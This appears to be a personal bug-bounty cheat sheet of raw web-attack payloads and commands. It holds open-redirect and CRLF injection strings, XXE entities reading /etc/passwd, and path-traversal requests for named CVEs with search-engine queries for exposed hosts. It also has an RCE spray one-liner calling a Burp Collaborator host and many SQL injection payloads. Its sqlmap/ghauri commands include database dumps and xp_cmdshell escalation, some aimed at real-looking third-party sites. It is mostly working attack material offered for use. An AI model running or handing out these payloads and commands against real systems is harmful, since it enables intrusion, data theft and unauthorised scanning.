?url=http://{target} ?url=https://{target} ?next=http://{target} ?next=https://{target} ?url=https://{target} ?url=http://{target} ?url=//{target} ?url=$2f%2f{target} ?next=//{target} ?next=$2f%2f{target} ?url=//{target} ?url=$2f%2f{target} ?url=//{target} /redirect/{target} /cgi-bin/redirect.cgi?{target} /out/{target} /out?{target}


/out?/{target} /out?//{target} /out?/\{target} /out?///{target} ?view={target} ?view=/{target} ?view=//{target} ?view=/\{target} ?view=///{target} /login?to={target} /login?to=/{target} /login?to=//{target} /login?to=/\{target} /login?to=///{target}
   
   
   few things i do when i get an open 
   (1) i spray that parameter to other endpoint of the web application.
(2) I always look into wayback machine for old urls to see if it have same or similar parameter.
(3) Google dorks to see if i can get the same parameter in another endpoint.

  tip tip  tip  tip
  First if the Applictaion have a user sign-In/Sign-Up feature,then register a user and log in as the user.

Go to your user profile page, for example: testvuln.com/accounts/profile
2. Copy the profile page's URL

3. Logout and Clear all the cookies and go to the homepage of the site.

4. Paste the Copied Profile URL on the address bar

5. If the site prompts for a login,check the address bar,you may find the login page with a redirect parameter like the following:

https://testvuln.com/login?next=/accounts/profile

https://testvuln.com/login?returnUrl=/accounts/profile

2. How To Bypass
Use `@`
https://testvuln.com/login?next=https://vuln.me@evit.com

- due to bad regex

Use url encoded
https://testvuln.com/login?next=http://evil%E3%80%82com

- By using the character.(%E3%80%82 url encoded)instead of a normal dot in urls,it is possible to bypass the blocking.

3. Try to leverage it to Xss
https://testvuln.com/login?next=javascript:alert(1);//
   
   
   
   Open redirect 
   
   cat allurls.txt | gf redirect | openredirex -p /home/coffinxp/openRedirect/

domain_name=, or checkout_url=

Check for it in JavaScript files and hyml 

<meta http-equiv=“refresh” content=“0; url=https://www.google.com/”>


window.location = https://www.google.com/  window.location.href = https://www.google.com  window.location.replace(https://www.google.com)

When you’re searching for open redirect vulnerabilities, you’ll usually be monitoring your proxy history for a GET request sent to the site you’re testing that includes a parameter specifying a URL redirect
   
   
   
   
    𝗖𝗥𝗟𝗙    𝗖𝗥𝗟𝗙  𝗖𝗥𝗟𝗙       𝗖𝗥𝗟𝗙       𝗖𝗥𝗟𝗙           𝗖𝗥𝗟𝗙                         𝗖𝗥𝗟𝗙                            𝗖𝗥𝗟𝗙


  # CR/LF (Carriage Return/Line Feed) Injection     
https://medium.com/cyberverse/crlf-injection-playbook-472c67f1cb46
https://www.praetorian.com/blog/using-crlf-injection-to-bypass-akamai-web-app-firewall/

CR/LF (Carriage Return/Line Feed) injection is a type of security vulnerability. CR/LF refers to a sequence of two ASCII control characters: Carriage Return (CR, ASCII code 13) and Line Feed (LF, ASCII code 10). These characters are used in text files to signify the end of a line and control the positioning of the cursor or print head when displaying or printing text. CR/LF injection vulnerabilities occur when attackers insert CR/LF characters into input fields, file extensions or file uploads to manipulate application behavior. This can lead to exploits such as altering headers, injecting malicious code, or manipulating file content.
                 
                 
## Here are some tips for finding CRLF (Carriage Return Line Feed) vulnerability:

1️⃣: Look for places where user input is reflected in the HTTP response header. CRLF vulnerabilities often arise when user input is injected into the header without being properly sanitized.

2️⃣: Try injecting CRLF characters into user input fields to see if they are reflected in the header. For example, you might try inputting a string like "foo%0D%0Abar" into a search field and see if "foo" and "bar" appear as separate lines in the header.

3️⃣: Use a tool like Burp Suite to intercept and modify HTTP requests. This can make it easier to inject CRLF characters and analyze the resulting header.

4️⃣: Pay attention to the content of the header and how it changes based on your input. Look for patterns or anomalies that might indicate a CRLF vulnerability.

5️⃣: Keep in mind that CRLF vulnerabilities can be used to perform a variety of attacks, including HTTP response splitting, header injection, and cache poisoning.  
 
If you suspect that a CRLF vulnerability is present, be sure to thoroughly test and understand its potential impact.
                 
     ## crlf to path travesly   
#https://infosecwriteups.com/understanding-crlf-injection-7b042fd5fb22
http://vulnerable-website.com//www.google.com/%2f%2e%2e%0d%0aheader:header>
 
#TIP
  𝗖𝗥𝗟𝗙 𝗜𝗻𝗷𝗲𝗰𝘁𝗶𝗼𝗻 𝗕𝘆𝗽𝗮𝘀𝘀 𝘂𝘀𝗶𝗻𝗴 𝗚𝗕𝗞 𝗘𝗻𝗰𝗼𝗱𝗶𝗻𝗴
GET /Cybertix    ==>  404 Not Found
GET /%0D%0A%20Set-Cookie:cybertix=1  ==> 400 Bad Request
GET /%E5%98%8D%E5%98%8Set-Cookie:cybertix-1 ==> 𝟮𝟬𝟬 𝗢𝗞


   
      tip
   CRLF Injection


Where to find
It can be found anywhere, always check the request and response. Try to search for parameters that lead to redirects, you can see the response is (301, 302, 303, 307, 308).

How to exploit
Basic payload
https://example.com/?lang=en%0D%0ALocation:%20https://evil.com/
The response is

HTTP/1.1 200 OK
Content-Type: text/html
Date: Mon, 09 May 2016 14:47:29 GMT
Set-Cookie: language=en
Location: https://evil.com/
Double encode
https://example.com/?lang=en%250D%250ALocation:%20https://evil.com/
Bypass unicode
https://example.com/?lang=en%E5%98%8A%E5%98%8DLocation:%20https://evil.com/


  
  
  
  cheet sheet crlf
  
  1. HTTP Response Splitting
• /%0D%0ASet-Cookie:mycookie=myvalue
2. CRLF chained with Open Redirect
• //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2                     • /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2                       • /google.com/%2F..%0D%0AHeader-Test:test2
• /%0d%0aLocation:%20http://example.com
3. CRLF Injection to XSS
• /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
• /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
4. Filter Bypass
• %E5%98%8A = %0A = \u560a
• %E5%98%8D = %0D = \u560d
• %E5%98%BE = %3E = \u563e (>)
• %E5%98%BC = %3C = \u563c (<)
• Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test








XXE/ XML VULNERABILITIES                          XXE/ XML VULNERABILITIES                             XXE/ XML VULNERABILITIES




https://blog.detectify.com/best-practices/how-we-got-read-access-on-googles-production-servers/


Simple template 


<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" > ] > <foo>&xxe;</foo> See if it's possible to add


The following is a basic test:
<!--?xml version="1.0" ?--> <!DOCTYPE replace [<!ENTITY example "Doe"> ]>  <userInfo>   <firstName>Juan</firstName>   <lastName>&example;</lastName>  </userInfo> The following is a classic XXE:
<?xml version="1.0"?> <!DOCTYPE data [ <!ELEMENT data (#ANY)> <!ENTITY file SYSTEM "file:///etc/passwd"> ]> <data>&file;</data> <?xml version="1.0" encoding="ISO-8859-1"?>   <!DOCTYPE foo [   <!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo> <?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [   <!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo> This is classic XXE Base64 encoded:
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init;
]><foo/>




https:/​/​www.​davidsopas.com/​wikiloc-​xxe-​vulnerability/

  tip
  look for any where the site render xml ad try to exploit it with this writ-up
       https://honoki.net/2018/12/12/from-blind-xxe-to-root-level-file-read-access/


      CVES      CVES     CVES      CVES 
      Xss and nuclei template for it.

 CVE-2019-14974 , link for template 
github.com/conan-sudo/CVE…

How to use
Find so many subdomains and run the nuclei templates
https://twitter.com/hasansheet/status/1798752531205812373?t=Gjeo0ly2steQVUo1TrI6ew&s=19 



cve-2024-24919                             https://medium.com/@jeetpal2007/how-to-exploit-cve-2024-24919-path-traversal-5493c50d2581
Hunter: /product.name=”Check Point SSL Network Extender”
FOFA: title=”Check Point SSL Network Extender” 
SHODAN: http.title=”Check Point SSL Network Extender”




CVE-2024-34470 on 
@fofabot
 
Many vulnerable brazilian servers 🇧🇷

GET   /mailinspector/public/loader.php?path=../../../../../../../etc/passwd

Query⚙️title=="..:: HSC MailInspector ::.."

Link🔗https://en.fofa.info/result?qbase64=dGl0bGU9PSIuLjo6IEhTQyBNYWlsSW5zcGVjdG9yIDo6Li4i&page=1&page_size=10


   CVE-2024-4040
   https://github.com/rbih-boulanouar/CVE-2024-4040
   A server side template injection vulnerability in CrushFTP in all versions before 10.7.1 and 11.1.0 on all platforms allows unauthenticated remote attackers to read files from the filesystem outside of the VFS Sandbox, bypass authentication to gain administrative access, and perform remote code execution on the server.

python exploit.py -u https://example.com -p /etc/passwd



CVE Discovery at Scale
   github dorks for CVES
   https://medium.com/@dub-flow/the-easiest-way-to-find-cves-at-the-moment-github-dorks-29d18b0c6900
   
   PHP XSS:
          /\becho\b.*\$_GET\b/ or /echo\s+\$_REQUEST/
PHP XSS: 
          /^.*\becho\s+\$_GET\b.*$/
PHP XSS (most FP-prone): 
          /^.*\becho\s+\$\b.*$/
PHP SQL Injection:
                  /(SELECT|INSERT|UPDATE|DELETE)\s(.*\$_POST|.*\$_GET|.*\$_REQUEST)/
PHP OS Command Injection: 
               /(exec\(|system\(|shell_exec\(|passthru\()(.*\$_POST|.*\$_GET|.*\$_REQUEST)/
Host Header Injection (Node.js & PHP): 
             req.headers.host path:*pass* and /\$_SERVER\['host'\]|gethostname\(\).*(reset|forgot)/
.NET Host Header Injection: 
                     /(Request\.Headers\["Host"\]|Request\.Host\.Value|HttpContext\.Current\.Request\.Headers\["Host"\]|HttpContext\.Request\.Host\.Value)/ forgot
Host Header Injection generic:
                       host path:**/*forgot*/**
Insecure Deserialization in PHP: 
                    /(unserialize\()(.*\$_POST|.*\$_GET|.*\$_REQUEST)/


# #IIS-VUNERABILITY                              IIS-VUNERABILITY                               IIS-VUNERABILITY
https://docs.google.com/presentation/d/1AA0gX2-SI_9ErTkBhtW0b-5BH70-1B1X/edit?pli=1#slide=id.p46 
#nuclie-template
 https://github.com/projectdiscovery/nuclei-templates/blob/d6636f9169920d3ccefc692bc1a6136e2deb9205/fuzzing/iis-shortname.yaml
        
# #Discovering
#### Shodan 
 http.title:"IIS"
Company dork
Ssl:"Bsides Ahmedabad Inc." http.title:"IIS"

Host dork
Ssl.cert.subject.CN:"bsidesahmedabad.in" http.title:"IIS"

  Tools For Testing
 1) IIS Tilde Enumeration (Burp Extension)
2) Shortscan tool Github
   (to detect short names of files and directories)
3) JetBrains dotPeek
    (to analyze files such as dll file and export the source of that file)
4) visual studio code 
     [for read/review the code/source]

###### #Testing
Sortscan basic usage
shortscan https://url/
Burp Extension IIS Tilde Enumeration
Copy the target url and scan 
**NOTE** 
any valid dir endpoint such as 403,401,301,200 etc… 
scan that endpoint again , not just the url 

  
example
$ shortscan https://bsidesahmedabad.in/
$ shortscan https://bsidesahmedabad.in/admin/
$ shortscan https://bsidesahmedabad.in/test/
FFUF fuzzing
$ ffuf -w iis.txt -u https://bsidesahmedabad.in/FUZZ
$ ffuf -w iis.txt -u https://bsidesahmedabad.in/shortnameFUZZ
Shortname-FUZZ / shortname_FUZZ


Tips to complete the shortname and get a valid Dir/file
https://IIS/
 [+] Identified directories: 
 1
 |_ DS_STO~1
Identified files: 1
|_ DESKTOP~1.ZIP

###### #FFUF
$ ffuf -w iis.txt -u https://IIS/ds_stoFUZZ
$ ffuf -w iis.txt -u https://IIS/desktopFUZZ.zip
$ ffuf -w iis.txt -u https://IIS/desktop-FUZZ.zip
$ ffuf -w iis.txt -u https://IIS/desktop_FUZZ.zip
$ ffuf -w iis.txt -u https://IIS/desktop%20FUZZ.zip

2) Github dorking 
     Path:/ds_sto
3) Chat AI
    GENERATE A long worldlist starting ds_sto

4) Intruder (numbers 0-100000)/Etc….




        RCE        RCE                    RCE                                        RCE                                       RCE                                               RCE                            RCE 
        tools     https://github.com/plenumlab/rce-finder
   

   tip
   This is the quickest RCE I've ever gotten.                   https://x.com/nav1n0x/status/1811724350040457621
The app has a popup for multi-selection fields. I intercepted the request, expecting XSS or SQLi, but found that the parameter **_session_name= can be exploited to get an #RCE as a surprise.

Payload: `&**='.print((`id`)).'`         





   tip    If you get Response of your burp collab ! Boom RCE
   
cat domains.txt |assetfinder --subs-only |httprobe |gau|gf exclude|grep '='|qsreplace -a ' ||curl //yourburp-collabrater.burpcollaborator.net'|while read url; do rce=$(curl -s $url);echo -e "[RCE-test]$url";done


 
 SQL INJECTION        SQL INJECTION          SQL INJECTION            ****check for cypher injection
    
 

 https://medium.com/@amitdutta6026/bypassing-cloudflares-sql-injection-filter-without-origin-ip-discovery-2bb8c97bc5db
 https://medium.com/@daoud_youssef/from-host-header-injection-to-sql-injection-e7c61a61b575 
 https://medium.com/@HX007/subdomain-fuzzing-worth-35k-bounty-daebcb56d9bc
     https://pentestbook.six2dez.com/enumeration/web/sqli
  https://hacktube5.online/sqlmap-tamper-scripts-to-bypass-waf/
  https://medium.com/@bug4y0u/how-i-got-4-sqli-vulnerabilities-at-one-target-manually-using-the-repeater-tab-ed4eb1f84147 
  https://github.com/malvads/sqlmc
  https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
  https://portswigger.net/web-security/sql-injection/cheat-sheet
  https://web.archive.org/web/20240724043857/https://github.com/ifconfig-me/SQL_Injection-Techniques                       payload and technique
  
  https://github.com/gagaltotal/Bypass-WAF-SQLMAP/blob/master/WAF-SQLMap-Full                                          // sqlmap waf bypass
  
   
   check this tool https://github.com/danialhalo/SqliSniper
   
   
      tip
      'm usually using these dorks to find p1 bugs like sql injection or information disclosure

==> site:*<*.target.tld  ext:php | ext:asp | ext:aspx
==> site:*<*.target.tld "password.xlsx" ext:xlsx



  
   
   
   
   tip on error base sqli

remenmber that   developer block or filter ' "   # ; ?  these ..  check  error_base_payload   and see alot of payload to use..  if there is  any error try sqli with ghauri and sqlmap and manually in burp to confirm more..
 

 
    ‘/*!Union/*AmitTheNoob*/*/ select 1,2,3,table_name,5,6 from information_schema.tables where table_schema=database().
 
https://github.com/HernanRodriguez1/SQLi_Sleeps
 https://www.codelivly.com/sql-injection-101-understanding-the-basics-of-sql-injection-attacks/

#TIP 
 payload 
 admin’ or ‘1’=’1'#
-10'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z
XOR(if(now()=sysdate(),sleep(9),0))XOR\"Z
  
  #TIP
  # Time-Based Blind SQL Injection in Oracle
  'and 1=DBMS_PIPE.RECEIVE_MESSAGE(1,10)--   



  that's a fancy SQLi payload. Working against almost everything.
/?query="OR 1=1;--"&val1=ZGlkbnQgZXZlbiByZWFk&val2=aHR0cHM6Ly95b3V0dS5iZS9kUXc0dzlXZ1hjUQ%3D%3D&SLEEP(420)
          
#tip
try testing for SQLi Authentication Bypass 
username:'--'/"--"
password:'--'/"--"

admin’ OR 1=1- -‘


   tip 
   sql  waf bypass  throught obfuscation                              https://medium.com/@amitdutta6026/bypassing-cloudflares-sql-injection-filter-without-origin-ip-discovery-2bb8c97bc5db
     ‘/*!UnIon/*trick-comment*/*/ sElect 1,2,3,4,5,6 — -.                                                                           php?id=123%"20'‘/*!UnIon/*trick-comment*/*/ sElect 1,2,3,4,5,6 — -.
     ‘/*!Union/*AmitTheNoob*/*/ select 1,2,3,table_name,5,6 from information_schema.tables where table_schema=database().
     
     
   
   


  #TIP 
 If you come across a domain that uses Typo3 CMS, be sure to check its parameters. Old version Typo3 CMSs may still earn you rewards.
Payload ;
-1+OR+3 AND if(now()=sysdate(),SLEEP(9),0)-- wXyW2 AND if(now()=sysdate(),SLEEP(9),0)-- wXyW1=6 +AND+000762=000762



   #tip
   The target has an admin login page where certain methods are allowed. I found the API endpoint for the admin login and sent the same payload. Success.  
   
POST /admin/login ==> 405 
POST /api/v01/admin/login ==> 200 OK + Blind SQLi 

   tip
 check if you could test all the parameter with =  25%25

#tip
 escalating-time-based-sql-injection-to-rce-using-xp-cmdshell-1b724b8e3c90
     https://medium.com/@harrmahar/escalating-time-based-sql-injection-to-rce-using-xp-cmdshell-1b724b8e3c90
     website using  Microsoft SQL Server 
     EXEC xp_cmdshell 'ping 165.1.2.123';                       vps 
     
  https://redacted.com/download/123/123 EXEC xp_cmdshell 'ping%20165.1.2.123';--       
  https://redacted.com/download/123/123%20EXEC%20xp_cmdshell%20'ping%20165.1.2.123'%3b--         urldecoded
  
  tcpdump -i eth0 -icmp
  
  
  #tip
  If you're able to find a JSON POST-based potential SQL injection (SQLi), remember to execute the SQLMAP query with -u and --data using JSON input. I've found more success using this method in SQLMap than when using a request file.
  
  #tip
    Based on the information gathered from the Nuclei scan, which revealed that the application uses PHP running on Apache, I focused on sending MySQL Sleep payloads
    
#TIP
    1. sqlmap -u http://target.com/registration --dbs --forms --crawl=2
2. it will crawl all the links having input field
3. select the parameter you want to test
 
 tip
 Always try the "\" character in login entries. It can trigger an SQL.

curl -d 'username=1\&password=1\' -X POST https :// login(.)domain(.)com
 
 for email
 "' OR 1=1 -- '"@example.com
"mail'); DROP TABLE users;--"@example.com
 
 waybackurls http://testphp.vulnweb.com | gf sqli | tee -a sqli.txt ; wait ; sqlmap -m sqli.txt --batch --random-agent --level 1
 
 waybackurls http://testphp.vulnweb.com | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt
 
 cat urls.txt | sed 's/=/=(CASE%20WHEN%20(888=888)%20THEN%20SLEEP(5)%20ELSE%20888%20END)/g' | xargs -I{} bash -c 'echo -e "\ntarget : {}\n" && time curl "'{}'"'
 
     
     
       tip
       check if you could bypass waf by  using line folding behavior.                                                    https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies
       GET / HTTP/1.1\r\n
     Host: target.com\r\n
    X-Query: Value\r\n
     \t' or '1'='1' -- \r\n
   Connection: close\r\n
  \r\n
 
 
#tip
SQL Injection in MS Access with backslash escaped 
SELECT * FROM Users WHERE Username = 'a\' OR \'a\'=\'a' AND Password = 'a\' OR \'a\'=\'a'
SELECT * FROM Users WHERE Username = 'a\' OR 5=10\'2' AND Password = 'a\' OR 5=10\'2

#tip
Sql injection 
 https://hackerone.com/reports/531051 
AlwaYS attempts to mount XXE (XML External Entity) attacks on the file upload form . AND CHECK If XML encoded single quote caused a database error, then try SQli injection 



#tip
Remember,  when ' is filtered out, then CHAR(27) is used  nd try also inserting it on every url parameter  and also try (‘ or 1=2 — )  incase there is firewall blocking  '  or 1=1 -- 
' UNION SELECT CONCAT(name, " ",
ssn) FROM ssn LIMIT 1 OFFSET 1-- -,

Selecting only one table

#tip
Sleep payload when testing 

' or sleep(15) and 1=1#
' or sleep(15)#
' union select sleep(15),null#

#Tip  tip tip
In a comment or picture that has an id, try create an imagery id and watch the response,  then try sql injection by   t inserting 123456789 OR 1=1 into the  address bar as the pic_id parameter. try the emoji in  ant  input field below give 😯. somtimes develper dont validate emoji

UNION SELECT 1,2,username,password FROM users WHERE username='admin'
 
 #tip
 users=any@mail.com&pass=admin
--> 1 sec

user=any@mail.com'XOR(SELECT(0)FROM(SELECT(SLEEP(10)))a)XOR'Z
--> 30s

user=any@mail.com'XOR(SELECT(0)FROM(SELECT(SLEEP(20)))a)XOR'Z
--> 30s
 
     TIP
     Sometimes bypassing SQL can be a problem, you can try this way
payload ;

8%20or%207250%3d0725

sqlmap ;
sqlmap -u 'h t t p :// domain[.]com / anyfile.asp?id_test=8%20or%207250%3d07250' --dbs --random-agent ignore=500 - -code=200 -T tablename --columns -- no-cast

        sqlmap -u "https://www.cadiak.com.la/reporttype.php?id=2" --batch -D cbl22 --tables --threads=5 --force-ssl
   
   
   tip
        Post sql) Put ' in search box it reflect sql error in response after that intercept request in burpsuite and in search param put * so sqlmap will automatic detect param endpoint to test  and copy all request and save it in file and use -r flag in sqlmap
 
 
 
#tip 
 echo https://www.recreation.gov | waybackurls | grep "?" | uro | httpx -silent > param.txt
cat subdomains.txt | waybackurls | grep "?" | uro | httpx -silent > param.txt
sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt
sqlmap -u https://my.easyname.at/en/login --dbs --forms --crawl=2


  some simple payload for sql eror  and where to inject  
  
  /?q=1
/?q=1'
/?q=1"
/?q=1`
/?q=1\
/?q=1' or '1'='1
/?q=1 or 1=1
/?q='or''='
/?q=[1]
/?q[]=1
/?q=1/*'*/
/?q=1/*!1111'*/
/?q=1'||'asd'||'

    Value
    Parameter
    Parameter=Value
    Header
    Cookies
    Path



   tip  
   hunting in smart way
   

Step 1: I used google dork to fetch all the login pages → site:redacted.com inurl:login

Step 2: Make a list of SQL payloads, hit on all the login pages with Intruder.

Step 3: Check for SQL Query in error/response.

Step 4: If you successfully get SQL error → Run SQL map

Step 5: Get the big FAT Bounty !!!!



  
  Found SQL Injection to Account Takeover Manually :) 
1. Enter mobile number to login intercept
{"mobile_number":"8888888888"} >> 200
{"mobile_number":"8888888888'"} >> 500
{"mobile_number":"8888888888''"} >> 200
  
  
  #Time-based-SQL-injection
  cat domain.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'
  
  #tip
  if The target is running the Postgres SQL server put the Unicode char  "\u0000"  and see the magic 😄
note:  this can break the database
  
  
  
   SQL ERROR
 POST /updateUser
 Host: example.com

 user_id=1338&name=test
 
 If you were to provide user_id=1338-1 and it was vulnerable, then the code would execute against user_id=1337. The code

$sql = "UPDATE users SET name='test' WHERE id='1338-1'"; will be executed as being user id 1337


   #tip
   stumbled on subdomain giving 403    example legacypanel.redacted.com
   added a path to it and watch the response 
   legacypanel.redacted.com/dummy, check the response to check if it gives 404
   indicating 404 means that the 403 restriction was only applied on the main domain and not on other paths.
   fuzz and bruteforce  to get other paths and get the register box
   1234’ %2F%2A%2A%2FAnd%2F%2A%2A%2Fsleep(5)   on the resgiter page /// try other bypass if blocked by waf
   
  
   
#TIP 
Found SQL Injection in [org_id] Cookie
Payloads for Testing: 
-1 OR 0=6 AND 0-0=> FALSE 
-1 OR 6=6 AND 0-0=> TRUE

#tip 
Injected in request like this
Cookie:organization_id=-1%20OR%200%3D6%20AND%200-0

  #UniBox   
  username field , you can place in any password
   'or 1=1 limit 1-- -


  TIP
     **** #Tip  tip tip   in every comment 
In a comment or picture that has an id, try create an imagery id and watch the response,  then try sql injection by    inserting 123456789 OR 1=1 into the  address bar as the pic_id parameter. 


  #tip
  Sql injection tutorial on Addslashes
http://leettime.net/sqlninja.com/tasks/mics_ch6.php?id=1%af%5c'Union(select(1),version(),3,4,5,6,7,8)%23 
   
   #tip
   Sending payload on burp within the URL/URI itself can also trigger SQL injection. So don't just focus on the parameters.
   
#tip
  Note and tip
  SQLi Tip - If you're able to find a JSON POST-based potential SQL injection (SQLi), remember to execute the SQLMAP query with -u and --data using JSON input. I've found more success using this method in SQLMap than when using a request file
  



 
 
---
𝗧𝗶𝗺𝗲 𝗯𝗮𝘀𝗲𝗱 𝗦𝗤𝗟 𝗜𝗻𝗷𝗲𝗰𝘁𝗶𝗼𝗻 𝗢𝗻𝗲𝗹𝗶𝗻𝗲𝗿
cat urls.txt | grep "=" | qsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)" > blindsqli.txt
 
 
 Always try the "\" character in login entries. It can trigger an SQL.

curl -d 'username=1\&password=1\' -X POST https :// login(.)domain(.)com
  


  #tip 
    https://github.com/ferreiraklet/Jeeves
      cat sql_wordlist.txt | while read payload;do echo http://testphp.vulnweb.com/artists.php?artist= | qsreplace $payload | jeeves -t 5;done
  
  
  tip
 SQL Injectjon for Contact/Registration Forms .
1. sqlmap -u http://target.com/registration --dbs --forms --crawl=2
2. it will crawl all the links having input field
3. select the parameter you want to test
  
  
  
   5 COMMAND CAN HELP TO EASILY IDENTIFY SQL INJECTION                                                               
   1. sublist3r -d target | tee -a domains (you can use other tools like findomain, assetfinder, etc.)
  2. cat domains | httpx | tee -a alive
  3. cat alive | waybackurls | tee -a urls
  4. gf sqli urls >> sqli
  5. sqlmap -m sqli --dbs --batch
  6. use tamper scripts
  
  
  tip 
  https://x.com/vulncure/status/1734908685103575408?s=20
     
           #or
         use this

            3 easy steps to get your first SQLi:
1️⃣ Waybackurls: Gather all the possible url’s of a target.
cat target.txt | waybackurls | tee urls.txt
2️⃣ GF tool: Filter all the SQL parameters of a target and save it as any.txt.

cat any.txt | gf sql > any.txt
3️⃣ SQLmap: Send any.txt to SQLmap.

python http://sqlmap.py -m any.txt  —risk 3 —batch
💸 Alternatively use Gahuri to test the same
     
          
     
#tip
 boolean-based SQL injection payload
      "XOR(if((select/**/666/**/where/**/1=1),444,0))XOR"       // This would result in a TRUE condition returning a response of ~21,000 bytes
"XOR(if((select/**/666/**/where/**/1=2),444,0))XOR"             // This would result in a FALSE condition returning ~27,000 bytes




                                  
     
    http://thegreycorner.com/2017/01/05/exploiting-difficult-sql-injection.html 
    https://github.com/stephenbradshaw/pentesting_stuff/blob/master/helper_servers/sqlmap_secondorder_helper_server.py
     NOTE
  use NULL values in the UNION SELECT? NULL is a great value to use in UNIONS when trying to determine the correct number of columns in an injection, as it can sit in place of a number of different field types, such as numbers, strings and dates
  
  Detection options
     --string='Name\x0a\x09\x09Stephen'



       SQLMAP   PAYLOADS                    SQLMAP   PAYLOADS                       SQLMAP   PAYLOADS 
        https://medium.com/@cuncis/the-ultimate-sqlmap-tutorial-master-sql-injection-and-vulnerability-assessment-4babdc978e7d
          https://cybr.com/ethical-hacking-archives/sqlmap-cheat-sheets-to-help-you-find-sql-injections/
     
        check this for  sql-map WAF bypass
                                     https://github.com/gagaltotal/Bypass-WAF-SQLMAP/blob/master/WAF-SQLMap-Full
       
       
        #tip
  Do you know that sqlmap has its own crawler? Run in the background easily:
sqlmap -u 'https://target\.com' --crawl=3 --random-agent --batch --forms --threads=5 --hostname --timeout=15 --retries=1 --time-sec 12
         
  python3 sqlmap.py -u https://www..gov./press-release-detail?id=6622 — batch — banner — dbs — dump-all technique=E — risk 3 — level 4 -v 3 — prefix="'(" — suffix="')" — flush-session — random-agent
  
  python3 sqlmap.py "https://www...x.x.x..com/en/login.php?destination=%2Forchis%2F6%3FPHPSESSID%3D&PHPSESSID=" — level=5 — risk=3 — banner — dump-all
  
  
  
  #tip
  SQLMap from Waybackurls
waybackurls target | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt && cat urls.txt | xargs -I{} sqlmap --technique=T --batch -u "{}"
  
 
     
      
        MODIFYING HTTP HEADERS AND COOKIES
        to modify the User-Agent header to "Mozilla/5.0" 
        sqlmap -u <target URL> --headers="User-Agent: Mozilla/5.0"
        
         to modify the PHPSESSID cookie to "12345" 
         sqlmap -u <target URL> --cookie="PHPSESSID=12345"
     
      TAMPERING WITH REQUEST PARAMETERS
      --data: This option allows you to set or modify the data sent in the request body during the scan. You can use it to modify parameters such as username, password, id
      to modify the id parameter to "1' OR 1=1#"
      sqlmap -u <target URL> --data="id=1' OR 1=1#"
       sqlmap -u <target URL> --data="id=%27+OR+1%3D1--"                     //      Bypassing input filters
       
     sqlmap -u <target URL> --data="id=1' AND SLEEP(5)--"      using timebase , If a database has a firewall in place that blocks certain SQL commands or queries
     sqlmap -r request.txt --random-agent --dbs --proxy=http://127.0.0.1:8080 --force-ssl --batch --risk 3 --level 3
      
      --tamper       This option allows you to use custom tampering scripts to modify the data sent in the request body.
      sqlmap -u <target URL> --data="id=1' OR 1=1#" --tamper=apostrophemask.py
        sqlmap -u <target URL> --data="id=1' OR 1=1#" --tamper=tamper/space2hash.py                         //      Bypassing input filters     WITH TAMPER 
        
        Error-Based Sql Injection🤑️
        sqlmap -u "http://example.com/vulnerable.php?id=1" --technique E --dump
      
        
        Blind SQL Injection
       sqlmap -u "http://example.com/vulnerable.php" --data="username=admin&password=password" --technique B --string="Welcome, admin!" --not-string="Invalid login"
       
       
       #tip
  *configure sqlmap to use this prefix and suffix:*
    --prefix="' " --suffix=' -- a'
      ...&param=r -p param --prefix="cana'||" --suffix="||'y.bluebird" --tamper space2comment --level=3 --risk=2 --string "select distinct object from ucon_p" --code=500 --dbms PostgreSQL --skip-urlencode --no-escape --no-cast --banner --technique=B
       
       
       
         #using-sqlmap
  https://cybr.com/ethical-hacking-archives/sqlmap-cheat-sheets-to-help-you-find-sql-injections/
  --tamper
  --tamper="random,appendnullbyte,between,base64encode"     //     This would instruct sqlmap to use all of the scripts separated by commas.
  --tamper="between,randomcase"    
    --list-tampers           list all the temper
       
       
           
Level 2    look for  HTTP Cookie headers for SQL injection vulnerability
sqlmap -u 'http://localhost:8440/" --level=2
sqlmap -u 'http://localhost:8440/" --level=2 --cookie="PHPSESSID=..." --param-exclude="PHPSESSID"
sqlmap -u 'http://localhost:8440/" --level=2 --cookie="PHPSESSID=..." --skip="cookies"
sqlmap -u 'http://localhost:8440/" --level=2 --cookie="PHPSESSID=..." -p "id"

                   

        
    
     
     
     
using GHARUI                       using GHARUI                     using GHARUI

 ghauri -r a.txt - dbs - batch
 ghauri -r a.txt - dbs -D xxxxxlive -T admin - columns
 ghauri -r a.txt - dbs -D xxxxxlive -T admin - dump - batch
    Basic Scan with Custom User-Agent and Cookie:
    ghauri -u https://www.site.com/vuln.php?id=1 --user-agent "mozilla/5.0" --cookie "PHPSSESSID=ABACE22333"
 
 skipping URL Encoding of Payload Data:
This command skips URL encoding of payload data while testing the 'id' parameter for SQL injection
 ghauri -u https://www.site.com/vuln.php?id=1 --p id --skip-urlencode
   
   fresh quieries
    ghauri -u https://www.site.com/vuln.php?id=1 --fresh-queries
 
 Testing Specific Parameter with Prefix and Suffix:
